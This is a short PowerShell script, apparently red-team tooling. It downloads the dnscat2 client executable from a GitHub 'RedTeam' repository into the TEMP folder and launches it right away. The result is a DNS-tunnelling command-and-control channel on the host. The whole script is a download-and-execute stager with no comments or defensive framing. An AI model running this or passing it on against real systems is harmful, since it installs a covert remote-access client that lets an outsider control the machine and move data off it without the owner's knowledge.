$webClient = New-Object System.Net.WebClient
$url1 = "https://github.com/sh1katagana1/RedTeam/raw/refs/heads/main/dnscat2-v0.07-client-win32.exe"
$filepath1 = "$env:TEMP\dnscat2-v0.07-client-win32.exe"
$webClient.DownloadFile($url1, $filepath1)
Start-Process -FilePath $env:TEMP\dnscat2-v0.07-client-win32.exe
